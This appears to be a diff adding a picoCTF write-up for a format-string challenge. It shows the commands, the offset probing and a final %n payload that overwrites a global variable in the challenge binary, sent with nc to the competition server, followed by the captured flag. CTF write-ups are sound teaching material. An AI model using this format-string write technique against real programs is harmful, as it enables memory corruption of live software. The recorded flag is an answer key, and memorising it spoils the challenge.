@@ -1,0 +1,64 @@
+# download source code
+$ curl -sO https://artifacts.picoctf.net/c_rhea/14/vuln.c
+
+# download binary
+curl -sO https://artifacts.picoctf.net/c_rhea/14/vuln
+
+# check the executable info
+$ checksec --file=vuln           
+
+> RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+> Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   42 Symbols        No    0               2               vuln
+
+Binary has PIE flag disabled. Means all the addresses in the executable will stay fixed.
+
+
+# After reading the code vuln.c
+# Needs to update the sus global variable directly using format string vuln
+
+# Get the address of sus variable
+$ objdump -t vuln | grep sus
+> 0000000000404060 g     O .data	0000000000000004              sus
+
+
+Address is 0x0000000000404060
+Now we know that our payload needs to add '\x60\x40\x40\x00\x00\x00\x00\x00' somewhere
+
+
+Now, by running the binary, check at which position our input string is located. 
+After some trials, figured out that %14$X will print the first byte of our input. 
+Means, if we input 'AAAA,%14$X', it will print 'AAAA,41414141', where '41' is the hex value of 'A'
+
+---
+To write some value in sus variable, we will use %n modifier. But the issue is that the address comtains 
+null bytes. Hence, instead of adding the address at the beginning, we can add address at the end. 
+It will look like this
+'somestring,%n,<padding><susaddress>'
+
+---
+# I tried above value in both little endianness and big endianness. Seems it worked with the same order as shown in code.  
+Code expects value of sus to be 0x67616c66 or '1734437990' in decimal. 
+So our input will look something like this.
+'%1734437990X,%n,<padding>,<susaddress>'
+Here, %<num>X, will generate the string of num length. Hence, num can be used to control the value that %n will write.
+
+--
+Now that we have added relevant characters, let's check at which byte our address is stored. 
+# I remove the number modifier to reduce the string count for testing.
+After some experiments, input 'AAAABBBB%9X,%17$X,PPPPPPAAAABBBB' will print 'AAAABBBB   402075,41414141,PPPPPPAAAABBBB'
+It means, output from %17$X = 41414141. So we can safely add the address of sus at AAAA and replace %17$X with %17$n
+
+---
+As final output, I tried '%1734437990X%17$n,PPPPPPP\x60\x40\x40\x00\x00\x00\x00\x00' 
+
+# -n flag is needed locally, but for remote process
+$ echo -ne '%1734437990X%17$n,PPPPPPP\x60\x40\x40\x00\x00\x00\x00\x00'  | ./vuln
+
+$ echo -e '%1734437990X%17$n,PPPPPP\x60\x40\x40\x00\x00\x00\x00\x00' | nc rhea.picoctf.net 49415 > outfile
+$ fold -w80 outfile > foldfile
+$ tail foldfile
+
+> 402075,A,,PPP`@@
+> I have NO clue how you did that, you must be a wizard. Here you go...
+> picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}
+
